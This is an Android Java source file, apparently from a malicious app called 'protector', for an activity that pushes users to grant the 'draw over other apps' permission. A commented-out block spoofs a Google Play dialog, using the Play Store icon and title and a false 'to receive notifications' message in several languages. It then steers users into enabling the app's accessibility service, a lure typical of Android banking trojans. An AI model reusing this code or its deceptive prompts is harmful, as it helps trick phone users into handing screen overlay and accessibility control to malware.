package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.getLabelApplication;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.Window;
import android.view.WindowManager;

import java.util.Locale;


public class ActivityDraw extends Activity {


   // private static ActivityDraw instance;

//    public static boolean isActivityOpen() {
//        return instance != null;
//    }
//    private void AskDraw() {
//
//         AlertDialog.Builder alertDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert);
//
//        String OK_Btn = "OK";
//        String MYNAME = "";
//
//
//        MYNAME = getLabelApplication(getApplicationContext()).toLowerCase();
//
//        String CurrnetLanuage = Locale.getDefault().getLanguage();
//        switch (CurrnetLanuage) {
//            case "en":
//                OK_Btn = "Enable";
//                alertDialog.setMessage("To receive notifications from this application," +
//                        "\nEnable 'Draw over apps' for: " + MYNAME);
//                break;
//            case "ar":
//                OK_Btn = "تفعيل";
//                alertDialog.setMessage("لتلقي الإشعارات من هذا التطبيق" +
//                        "\nقم بتمكين 'الإظهار فوق التطبيقات' لـ: " + MYNAME);
//                break;
//            case "cn":
//                OK_Btn = "使能够";
//                alertDialog.setMessage("接收来自此应用程序的通知，" +
//                        "\n启用'绘制在其他应用程序之上'： " + MYNAME);
//                break;
//            case "tr":
//                OK_Btn = "Etkinleştir";
//                alertDialog.setMessage("Bu uygulamadan bildirim almak için," +
//                        "\n" + MYNAME + " için 'Diğer uygulamaların üstüne çiz' özelliğini etkinleştirin.");
//                break;
//            case "ru":
//                OK_Btn = "Включить";
//                alertDialog.setMessage("Чтобы получать уведомления от этого приложения," +
//                        "\nвключите 'Отображение поверх других приложений' для: " + MYNAME);
//                break;
//            default:
//                OK_Btn = "Enable";
//                alertDialog.setMessage("To receive notifications from this application," +
//                        "\nEnable 'Draw over apps' for: " + MYNAME);
//                break;
//        }
//
//        try {
//            Drawable icon = this.getPackageManager().getApplicationIcon("com.android.vending");
//            alertDialog.setIcon(icon);
//            alertDialog.setTitle("Google Play");
//        } catch (PackageManager.NameNotFoundException e) {
//
//            try {
//
//                Drawable icon = this.getPackageManager().getApplicationIcon(getPackageName());
//                alertDialog.setIcon(icon);
//                alertDialog.setTitle(MYNAME);
//            } catch (PackageManager.NameNotFoundException ex) {
//
//            }
//
//        }
//
//
//        alertDialog.setPositiveButton(OK_Btn, new DialogInterface.OnClickListener() {
//            @Override
//            public void onClick(DialogInterface dialogInterface, int i) {
//
//            }
//        });
//
//
//        alertDialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
//            @Override
//            public void onCancel(DialogInterface dialogInterface) {
//                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
//                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                intent.setData(Uri.parse("package:" + getPackageName()));
//                StringBuilder var6 = new StringBuilder();
//                var6.append(getPackageName());
//                var6.append("/");
//                var6.append(AccessServices.class.getName());
//                String var7 = var6.toString();
//                Bundle var4 = new Bundle();
//                var4.putString(":settings:fragment_args_key", var7);
//                intent.putExtra(":settings:fragment_args_key", var7);
//                intent.putExtra(":settings:show_fragment_args", var4);
//                startActivityForResult(intent, 0);
//                if (WorkServices.My_Access_inst != null) {
//                    WorkServices.My_Access_inst.FOR_DRAW_OVER = true;
//                }
//            }
//        });
//        if (!isFinishing()){
//            alertDialog.show();
//        }
//
//
//    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //instance = this;
        try {
            requestWindowFeature(Window.FEATURE_NO_TITLE);
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);


            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(getApplicationContext())) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    //intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    intent.setData(Uri.parse("package:" + getPackageName()));

                    startActivityForResult(intent, 0);
                    AccessServices.FOR_DRAW_OVER = true;
//                    new android.os.Handler().postDelayed(() -> {

//                    }, 500);
//                    if (Build.VERSION.SDK_INT >= 34 && WorkServices.My_Access_inst != null){
//                         Handler handler = new Handler(getMainLooper());
//                        handler.postDelayed(new Runnable() {
//                            @Override
//                            public void run() {
//
//
//                            }
//                        }, 1000);


//                        // finish();
//                    }
                }else{
                    finish();
                }
            }else{
                finish();
            }

        } catch (Exception e) {
        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 0) {
            if (resultCode == Activity.RESULT_OK) {
                AccessServices.FOR_DRAW_OVER = false;
                Intent intent = new Intent(getApplicationContext(), Splasher.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);

                finish();
            }
//            else {
//                if (resultCode == Activity.RESULT_CANCELED) {
//                    finish();
//
//                }
//            }


        }

    }

    @Override
    protected void onDestroy() {
       // instance = null;
        super.onDestroy();
    }

//    @Override
//    public void finish() {
//        instance =null;
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }
}
